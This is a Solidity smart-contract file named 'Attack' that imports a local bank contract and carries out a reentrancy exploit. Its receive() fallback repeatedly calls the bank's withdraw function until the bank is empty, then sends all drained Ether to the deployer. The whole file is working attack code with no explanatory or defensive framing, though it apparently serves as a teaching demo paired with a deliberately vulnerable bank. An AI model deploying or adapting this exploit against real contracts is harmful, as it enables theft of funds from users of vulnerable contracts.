//SPDX-License-Identifier: MIT

import "./bank.sol";

contract Attack{

    address private owner;
    Bank private bankContract;

    event attackContractLoading(string message, uint bankBalance);
    event attackContractFinished(string message, uint bankBalance);


    constructor(address _bankAddress){
        bankContract = Bank(_bankAddress);
        owner = msg.sender;
    }


    function attack()external payable{
        bankContract.deposit{value: msg.value}();
        bankContract.withdraw();
    }

    receive()external payable{
        if(bankContract.getContractBalance() > 0){
            emit attackContractLoading("Attack Proceed...", bankContract.getContractBalance());
            bankContract.withdraw();
        }else{
            emit attackContractFinished("Attack Completed", bankContract.getContractBalance());
            payable(owner).transfer(address(this).balance);
        }
    }

    function attackContactBalance()public view returns(uint){
        return address(this).balance;
    }

    function getContractToAttackAddress()public view returns(address){
        return address(bankContract);
    }

}
